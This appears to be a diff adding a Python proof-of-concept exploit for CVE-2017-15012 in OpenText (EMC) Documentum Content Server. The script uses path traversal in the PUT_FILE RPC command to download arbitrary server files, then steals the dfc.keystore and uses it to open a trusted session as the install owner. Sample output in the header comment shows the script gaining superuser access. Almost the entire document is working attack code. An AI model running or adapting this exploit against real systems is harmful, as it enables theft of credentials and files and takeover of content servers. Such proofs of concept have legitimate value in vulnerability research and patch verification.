@@ -1,0 +1,171 @@
+#!/usr/bin/env python
+
+# Opentext Documentum Content Server (formerly known as EMC Documentum Content Server)
+# does not properly validate input of PUT_FILE RPC-command which allows any
+# authenticated user to hijack arbitrary file from Content Server filesystem,
+# because some files on Content Server filesystem are security-sensitive
+# the security flaw described above leads to privilege escalation
+#
+# The PoC below demonstrates this vulnerability:
+#
+# MacBook-Pro:~ $ python CVE-2017-15012.py
+# usage:
+# CVE-2017-15012.py host port user password
+# MacBook-Pro:~ $ python CVE-2017-15012.py docu72dev01 10001 dm_bof_registry dm_bof_registry
+# Trying to connect to docu72dev01:10001 as dm_bof_registry ...
+# Connected to docu72dev01:10001, docbase: DCTM_DEV, version: 7.2.0270.0377  Linux64.Oracle
+# Downloading /u01/documentum/cs/product/7.2/bin/dm_set_server_env.sh
+# Trying to find any object with content...
+#     Downloading /u01/documentum/cs/shared/config/dfc.keystore
+# Trying to find any object with content...
+#     Trying to connect to docu72dev01:10001 as dmadmin ...
+# Connected to docu72dev01:10001, docbase: DCTM_DEV, version: 7.2.0270.0377  Linux64.Oracle
+# P0wned!
+#
+#
+
+import socket
+import sys
+from os.path import basename
+
+from dctmpy.docbaseclient import DocbaseClient, NULL_ID
+from dctmpy.identity import Identity
+from dctmpy.obj.typedobject import TypedObject
+
+CIPHERS = "ALL:aNULL:!eNULL"
+
+
+def usage():
+    print "usage:\n\t%s host port user password" % basename(sys.argv[0])
+
+
+def main():
+    if len(sys.argv) != 5:
+        usage()
+        exit(1)
+
+    (session, docbase) = create_session(*sys.argv[1:5])
+
+    if is_super_user(session):
+        print "Current user is a superuser, nothing to do"
+        exit(1)
+
+    admin_console = session.get_by_qualification(
+        "dm_method where object_name='dm_JMSAdminConsole'")
+    env_script = admin_console['method_verb']
+    env_script = env_script.replace('dm_jms_admin.sh', 'dm_set_server_env.sh')
+
+    keystore_path = None
+    script = str(download(session, env_script, bytearray()))
+    if not script:
+        print "Unable to download dm_set_server_env.sh"
+        exit(1)
+
+    for l in script.splitlines():
+        if not l.startswith("DOCUMENTUM_SHARED"):
+            continue
+        keystore_path = l.split('=')[1]
+        break
+
+    if not keystore_path:
+        print "Unable to determine DOCUMENTUM_SHARED"
+        exit(1)
+
+    keystore_path += "/config/dfc.keystore"
+    keystore = str(download(session, keystore_path, bytearray()))
+
+    if not keystore:
+        print "Unable to download dfc.keystore"
+        exit(1)
+
+    (session, docbase) = create_session(
+        sys.argv[1], sys.argv[2],
+        session.serverconfig['r_install_owner'], "",
+        identity=Identity(trusted=True, keystore=keystore))
+    if is_super_user(session):
+        print "P0wned!"
+
+
+def download(session, path, buf):
+    print "Downloading %s" % path
+    print "Trying to find any object with content..."
+    object_id = session.query(
+        "SELECT FOR READ r_object_id "
+        "FROM dm_sysobject WHERE r_content_size>0") \
+        .next_record()['r_object_id']
+
+    session.apply(None, NULL_ID, "BEGIN_TRANS")
+    store = session.get_by_qualification("dm_filestore")
+    format = session.get_by_qualification("dm_format")
+    remote_path = "common=/../../../../../../../../../..%s=Directory" % path
+    result = session.put_file(store.object_id(), remote_path, format.object_id())
+    full_size = result['FULL_CONTENT_SIZE']
+    ticket = result['D_TICKET']
+
+    content_id = session.next_id(0x06)
+    obj = TypedObject(session=session)
+    obj.set_string("OBJECT_TYPE", "dmr_content")
+    obj.set_bool("IS_NEW_OBJECT", True)
+    obj.set_int("i_vstamp", 0)
+    obj.set_id("storage_id", store.object_id())
+    obj.set_id("format", format.object_id())
+    obj.set_int("data_ticket", ticket)
+    obj.set_id("parent_id", object_id)
+    if not session.save_cont_attrs(content_id, obj):
+        raise RuntimeError("Unable to save content object")
+
+    handle = session.make_puller(
+        NULL_ID, store.object_id(), content_id,
+        format.object_id(), ticket
+    )
+
+    if handle == 0:
+        raise RuntimeError("Unable make puller")
+
+    for chunk in session.download(handle):
+        buf.extend(chunk)
+
+    return buf
+
+
+def create_session(host, port, user, pwd, identity=None):
+    print "Trying to connect to %s:%s as %s ..." % \
+          (host, port, user)
+    session = None
+    try:
+        session = DocbaseClient(
+            host=host, port=int(port),
+            username=user, password=pwd,
+            identity=identity)
+    except socket.error, e:
+        if e.errno == 54:
+            session = DocbaseClient(
+                host=host, port=int(port),
+                username=user, password=pwd,
+                identity=identity,
+                secure=True, ciphers=CIPHERS)
+        else:
+            raise e
+    docbase = session.docbaseconfig['object_name']
+    version = session.serverconfig['r_server_version']
+    print "Connected to %s:%s, docbase: %s, version: %s" % \
+          (host, port, docbase, version)
+    return (session, docbase)
+
+
+def is_super_user(session):
+    user = session.get_by_qualification(
+        "dm_user WHERE user_name=USER")
+    if user['user_privileges'] == 16:
+        return True
+    group = session.get_by_qualification(
+        "dm_group where group_name='dm_superusers' "
+        "AND any i_all_users_names=USER")
+    if group is not None:
+        return True
+
+    return False
+
+
+if __name__ == '__main__':
+    main()
